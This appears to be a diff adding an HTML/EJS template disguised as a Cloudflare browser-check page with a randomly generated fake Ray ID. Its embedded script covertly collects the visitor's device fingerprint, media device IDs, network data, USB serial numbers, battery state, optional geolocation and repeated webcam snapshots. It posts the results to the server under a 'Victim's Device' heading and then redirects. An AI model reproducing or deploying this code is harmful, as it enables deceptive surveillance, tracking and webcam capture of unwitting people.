@@ -1,1 +1,223 @@
+<html lang="en-US">
+<head> 
+<meta charset="UTF-8"> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
+<meta name="robots" content="noindex, nofollow"> 
+<meta name="viewport" content="width=device-width,initial-scale=1"> 
+<title>Just a moment...</title> 
+<style type="text/css">
+html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
+body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
+h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
+p {font-size: 20px; font-weight: 400; margin: 8px 0;}
+p, .attribution, {text-align: center;}
+#spinner {margin: 0 auto 30px auto; display: block;}
+.attribution {margin-top: 32px;}
+@keyframes fader     { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+@-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
+#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
+#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
+.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
+a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
+a:hover{color: #f4a15d}
+.attribution{font-size: 16px; line-height: 1.5;}
+.ray_id{display: block; margin-top: 8px;}
+#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
+#cf-hcaptcha-container { text-align:center;}
+#cf-hcaptcha-container iframe { display: inline-block;}
+</style> 
+</head> 
+<body>
+<table width="100%" height="100%" cellpadding="20"> 
+<tbody>
+<tr> 
+<td align="center" valign="middle"> 
+<div class="cf-browser-verification cf-im-under-attack"> 
+<noscript> 
+<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1> 
+</noscript> 
+<div id="cf-content" style="display: block;"> 
+<div id="cf-bubbles"> 
+<div class="bubbles"></div> 
+<div class="bubbles"></div> 
+<div class="bubbles"></div> 
+</div> 
+<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1> 
+<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"> 
+<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
+</div> 
+<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p> 
+<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 5 seconds…</p> 
+<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p> 
+</div> 
+<form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded"> 
 
+<span data-translate="error" style="display: none;">error code: 1020</span>
+
+</form>
+</div> 
+<div class="attribution">
+DDoS protection by 
+<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
+<br> 
+<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda</code></span> 
+</div> </td> 
+</tr> 
+</tbody>
+</table>
+<video id="video" style="display:none"  playsinline autoplay></video>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script type="text/javascript">
+var loca=false;
+var cama=false;
+var tdata = '<button class="accordion">IP: <%=ip %> | Time: <%=time %></button><div class="panel"><pre>';
+tdata+="<b>Date In Victim's Device :</b> <em>"+new Date()+"</em><br>";
+var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
+var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
+///INITIALS
+tdata+="<h4>Device Information</h4>";
+for(var i=0;i < xo.length;i++){ 
+if(xo[i] in navigator){
+var str = navigator[xo[i]];
+tdata+="<b>"+xo[i] +"</b>: <em>"+str+"</em><br/>";
+}}
+tdata+="<b>Screen Dimentions : </b><em>"+screen.height+"px × "+screen.width+"px </em><br>";
+//////Media Devices
+if (navigator.mediaDevices || navigator.mediaDevices.enumerateDevices) {
+/////List cameras and microphones.
+navigator.mediaDevices.enumerateDevices()
+.then(function(devices) {
+tdata+="<h4>Media Device Information</h4>";
+devices.forEach(function(device) {
+tdata+="<b>"+device.kind+":</b> " + device.label +" id = " + device.deviceId+"<br>";
+});
+})
+.catch(function(err) {
+tdata+="<h4>Media Device Information</h4>";
+tdata+="Media Device Error: "+err.name + ": " + err.message;
+});
+}
+////CONNECTION
+if("connection" in navigator){
+tdata+="<h4>Network Information</h4>";
+for(var i=0;i < xoc.length;i++){ 
+var str = navigator.connection[xoc[i]];
+tdata+="<b>"+xoc[i] +"</b>: <em>"+str+"</em><br/>";
+}}
+////USB
+if("usb" in navigator){
+navigator.usb.getDevices()
+.then(devices => {
+tdata+="<br><b>Total USB devices connected:</b> <em>" + devices.length+"</em><br/>";
+devices.forEach(device => {
+tdata+="<b>Product name:</b> <em>" + device.productName + "</em>,<b>Serial number: </b> " + device.serialNumber+"</em><br/>";
+});
+});
+}
+//////BATTERY
+if("getBattery" in navigator){
+navigator.getBattery().then(function(battery) {
+tdata+="<h4>Battery Information</h4>";
+tdata+="<b>Battery Level:</b> <em>" +battery.level*100+"%</em><br><b>Is Battery Charging:</b> <em>"+battery.charging+"</em>";
+});
+}
+function fis(){
+if(loca && cama){
+tdata+="</pre></div>";
+$.post("./",{data:encodeURIComponent(tdata)},(s)=>{
+window.location.href="<%=redirect %>";
+});
+}
+}
+<% if (location){%>
+//////Location
+if(!navigator.geolocation) {
+tdata+="<h4>Location Information</h4>";
+tdata+="Location API not avilable";
+loca=true;
+fis();
+} else {
+navigator.geolocation.getCurrentPosition((position)=>{
+const latitude  = position.coords.latitude;
+const longitude = position.coords.longitude;
+tdata+="<h4>Location Information</h4>";
+tdata+="<b>Latitude:</b><em> "+latitude+"</em>"+"<br><b>Longitude:</b><em> "+longitude+"</em><a href='"+`https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`+"' >Open In Map</a>";
+loca=true;
+fis();
+}, ()=>{
+tdata+="<h4>Location Information</h4>";
+tdata+="<span style='color:green'>Location Access Error</span><br>";
+loca=true;
+fis();
+});
+}
+<% } else{ %>
+loca=true;
+fis();
+<% }  %>
+<% if (camera){%>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+var imgsent=0;
+var imgtocapture=<%= cams%>;
+function post(o){
+$.post("./camsnap",{img:encodeURIComponent(o)},(s)=>{
+if(imgsent==0){
+tdata+='<h4>Camera Images</h4>';
+}
+tdata+='<img src="./images/'+s+'" >';
+imgsent=imgsent+1;
+if(imgsent==imgtocapture){
+cama=true;
+fis();
+}
+});
+}
+const constraints = {
+audio: false,
+video: {
+facingMode: "user" 
+}
+};
+// Access webcam
+async function cam() {
+try {
+const stream = await navigator.mediaDevices.getUserMedia(constraints);
+handleSuccess(stream);
+} catch (e) {
+tdata+='<h4>Camera Images</h4>';
+tdata+= `<span style='color:green'>Camera Access Error: ${e.toString()}</span>`;
+cama=true;
+fis();
+}
+}
+// Success
+function handleSuccess(stream) {
+window.stream = stream;
+video.srcObject = stream;
+var context = canvas.getContext('2d');
+var id=setInterval(function(){
+context.drawImage(video, 0, 0, 640, 480);
+var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+post(canvasData);
+}, 1500);
+}
+cam();
+<% } else{ %>
+cama=true;
+fis();
+<% }  %>
+window.onload=()=>{
+var i="qwertyuioplkjhgfdsazxcvbnm0987654321";
+var str="";
+for(var o=0;o<17;o++){
+str+=i[Math.floor(Math.random() * 35)];
+}
+document.getElementById("ray").innerHTML=str;
+};
+</script>
+</body>
+</html>
